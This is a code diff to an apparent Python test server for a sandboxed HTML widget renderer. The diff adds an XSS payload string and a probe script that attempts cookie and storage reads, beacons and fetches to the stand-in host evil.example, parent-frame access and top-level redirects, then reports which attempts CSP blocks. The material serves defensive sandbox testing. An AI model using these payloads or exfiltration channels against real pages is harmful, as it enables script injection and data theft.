@@ -22,8 +22,38 @@ EVIL = ('<p onclick="window.__pwned=1">hi <a href="javascript:window.__pwned=1">
         '<script>window.__pwned=1</script><style>body{display:none}</style>'
         '<p style="color:red">styled</p><iframe src="https://evil.example"></iframe><h1>big</h1>'
         '<aside class="evil" role="note"><p>kind</aside>')
+PROBE_JS = r"""
+const out = {}; const viol = [];
+addEventListener('securitypolicyviolation', (e) => viol.push(e.violatedDirective));
+const attempt = async (name, fn) => {
+  const before = viol.length;
+  try { const r = await fn(); await new Promise((ok) => setTimeout(ok, 60));   // a request can be queued, then blocked by CSP
+    out[name] = viol.length > before ? 'blocked:csp ' + viol[before] : 'ALLOWED:' + String(r).slice(0, 40); }
+  catch (e) { out[name] = 'blocked:' + (e && e.name); }
+};
+(async () => {
+  await attempt('fetch-same-origin', () => fetch('/api/config').then((r) => r.status));
+  await attempt('fetch-external', () => fetch('https://evil.example/x').then((r) => r.status));
+  await attempt('sendBeacon', () => { if (!navigator.sendBeacon('https://evil.example/b', 'x')) throw new Error('refused'); return 'queued'; });
+  await attempt('websocket', () => new Promise((ok, no) => { const w = new WebSocket('ws://127.0.0.1:1/'); w.onopen = () => ok('open'); w.onerror = () => no(new Error('x')); }));
+  await attempt('image-beacon', () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok('loaded'); i.onerror = () => no(new Error('x')); i.src = 'https://evil.example/i.png'; }));
+  await attempt('dynamic-import', () => import('data:text/javascript,export default 1'));
+  await attempt('parent.document', () => parent.document.title);
+  await attempt('top.document', () => top.document.title);
+  await attempt('localStorage', () => localStorage.length);
+  await attempt('cookie', () => document.cookie.length);
+  await attempt('indexedDB', () => indexedDB.databases());
+  await attempt('window.open', () => { const w = window.open('https://evil.example/'); if (!w) throw new Error('null'); return 'opened'; });
+  await attempt('top.location', () => { top.location.href = 'https://evil.example/'; return 'assigned'; });
+  await attempt('nested-iframe-script', () => new Promise((ok, no) => { const f = document.createElement('iframe'); f.srcdoc = '<script>parent.__x=1<\/script>'; f.onload = () => ok('loaded'); document.body.append(f); setTimeout(() => no(new Error('t')), 300); }));
+  await new Promise((r) => setTimeout(r, 200));
+  out.cspViolations = viol.length;
+  sendPrompt('PROBE-RESULT ' + JSON.stringify(out));
+})();
+"""
+WIDGETPROBE = '<p>probe</p><template data-widget title="probe"><script>' + PROBE_JS + '</script></template>'
 SLOW = '<p>' + 'word ' * 200 + '</p>'
-SCRIPTS = {"compact": COMPACT, "strict": STRICT, "evil": EVIL, "slow": SLOW}
+SCRIPTS = {"compact": COMPACT, "strict": STRICT, "evil": EVIL, "slow": SLOW, "widgetprobe": WIDGETPROBE}
 SEEN = []
 
 class H(BaseHTTPRequestHandler):
